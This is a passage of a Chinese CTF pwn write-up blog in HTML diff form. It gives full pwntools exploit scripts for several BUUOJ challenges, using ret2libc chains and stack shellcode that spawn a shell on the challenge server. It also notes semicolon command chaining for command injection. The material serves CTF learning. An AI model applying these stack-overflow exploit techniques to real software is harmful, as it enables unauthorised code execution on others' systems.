+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cal addr</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;puts&#34;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>str_bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc = LibcSearcher(&#39;read&#39;, read_addr)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc_base = read_addr - libc.dump(&#34;read&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system_addr = libc_base + libc.dump(&#34;system&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># str_bin_sh = libc_base + libc.dump(&#34;str_bin_sh&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#attack</span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> p64(rdi) <span style="color:#f92672">+</span> p64(str_bin_sh) <span style="color:#f92672">+</span> p64(system_addr)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="bjdctf_2020_router">bjdctf_2020_router</h2>
+<p>这个题有意思，记录一下
+关键是 Linux 下指令可以用分号拼接
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230506101249.png" alt="image.png"></p>
+<h2 id="jarvisoj_level4">jarvisoj_level4</h2>
+<p>简单的 ret2libc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;level4&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc/libc-2.23-ubuntu16-32.so&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>, <span style="color:#ae81ff">27350</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># elf</span>
+</span></span><span style="display:flex;"><span>write_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;write&#39;</span>]
+</span></span><span style="display:flex;"><span>write_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;write&#39;</span>]
+</span></span><span style="display:flex;"><span>vuln <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;vulnerable_function&#39;</span>]
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gadgets</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># rdi = 0x4006b3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># rsi_r15 = 0x4006b1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#leak libcbase</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8c</span> <span style="color:#f92672">+</span> p32(write_plt) <span style="color:#f92672">+</span> p32(vuln) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p32(write_got) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>write_addr <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>print(hex(write_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cal addr</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> write_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;write&#34;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>str_bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc = LibcSearcher(&#39;read&#39;, read_addr)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc_base = read_addr - libc.dump(&#34;read&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system_addr = libc_base + libc.dump(&#34;system&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># str_bin_sh = libc_base + libc.dump(&#34;str_bin_sh&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#attack</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8c</span> <span style="color:#f92672">+</span> p32(system_addr) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(str_bin_sh)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="jarvisoj_level3_x64">jarvisoj_level3_x64</h2>
+<ul>
+<li>这个题真的坑爹</li>
+<li>首先是用本地的 libc 没解出来，然后用 libcsearch 也没解出来</li>
+<li>然后 read 换成 write 才成功</li>
+<li>已经遇到两次 read 的 libc 地址解不出来了，以后不用 read</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;level3_x64&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc/libc-2.23-ubuntu16-64.so&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>, <span style="color:#ae81ff">27049</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># elf</span>
+</span></span><span style="display:flex;"><span>write_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;write&#39;</span>]
+</span></span><span style="display:flex;"><span>write_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;write&#39;</span>]
+</span></span><span style="display:flex;"><span>vuln <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;vulnerable_function&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gadgets</span>
+</span></span><span style="display:flex;"><span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4006b3</span>
+</span></span><span style="display:flex;"><span>rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4006b1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#因为read函数已经将rdx设置为0x200足够我们用了</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#leak libcbase</span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x88</span> <span style="color:#f92672">+</span> p64(rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(rsi_r15) <span style="color:#f92672">+</span> p64(write_got) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(write_plt) <span style="color:#f92672">+</span> p64(vuln)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>write_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>print(hex(write_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#cal addr</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc_base = read_addr - libc.symbols[&#34;read&#34;]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system_addr = libc_base + libc.symbols[&#34;system&#34;]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># str_bin_sh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#39;write&#39;</span>, write_addr)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> write_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;write&#34;</span>)
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;system&#34;</span>)
+</span></span><span style="display:flex;"><span>str_bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;str_bin_sh&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#attack</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(p.recvline())</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x88</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x400648</span>) <span style="color:#f92672">+</span> p64(rdi) <span style="color:#f92672">+</span> p64(str_bin_sh) <span style="color:#f92672">+</span> p64(system_addr) <span style="color:#f92672">+</span> p64(vuln)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="ez_pz_hackover_2016">ez_pz_hackover_2016</h2>
+<p>写惯了 ret2libc 都忘记怎么 ret2text 了</p>
+<ul>
+<li>把 shellcode 写入栈，然后将返回地址覆盖为 shellcode</li>
+<li>这个题我有点想当然了，一开始将 shellcode 写入那个 s 的位置，没考虑长度够不够</li>
+<li>而且这个题 ida 分析到的偏移不对，实际要动态去调</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>, <span style="color:#ae81ff">27493</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;crash: &#39;</span>))
+</span></span><span style="display:flex;"><span>s_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">10</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(hex(s_addr))
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;crashme</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">26</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(s_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1c</span>) <span style="color:#f92672">+</span> shellcode
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="ciscn_2019_c_1">ciscn_2019_c_1</h2>
+<p>这个题太恶心了，做了好久</p>
+<ul>
+<li>64 位用到 bin/sh 记得 ret 平栈</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;ciscn_2019_c_1&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc/libc-2.27-Ubuntu18-64.so&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;ciscn_2019_c_1&#39;)</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>, <span style="color:#ae81ff">26942</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>encrypt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;encrypt&#39;</span>]
+</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400c83</span>
+</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4006b9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(encrypt)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>puts_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>print(hex(puts_addr))
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;puts&#34;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>str_bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(str_bin_sh) <span style="color:#f92672">+</span> p64(system_addr)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="jarvisoj_level3">jarvisoj_level3</h2>
+<p>这个题太简单，没啥说的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>, <span style="color:#ae81ff">28242</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;level3&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc-2.23-ubuntu16-32.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;write&#39;</span>]
+</span></span><span style="display:flex;"><span>read_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>]
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x88</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> p32(write_plt) <span style="color:#f92672">+</span> p32(main) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p32(read_got) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>read_addr <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>print(hex(read_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> read_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;read&#34;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>str_bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc = LibcSearcher(&#39;printf&#39;, printf_addr)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc_base = printf_addr - libc.dump(&#34;printf&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system_addr = libc_base + libc.dump(&#34;system&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># str_bin_sh = libc_base + libc.dump(&#34;str_bin_sh&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x88</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main) <span style="color:#f92672">+</span> p32(str_bin_sh)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="202353-harekazectf2019-baby_rop2">2023.5.3 HarekazeCTF2019 baby_rop2</h2>
+<p>这道题学习到了几个点</p>
+<ul>
+<li>64 位记得用寄存器，32 位传参是在栈上</li>
+<li>要懂得多试几个，这道题的 printf_got 用不了，那就换成 read</li>
+<li>关于接收地址，貌似是 32 位和 64 位不太一样，姑且这么认为吧。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>, <span style="color:#ae81ff">29445</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;babyrop2&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>printf_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;printf&#39;</span>]
+</span></span><span style="display:flex;"><span>printf_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>]
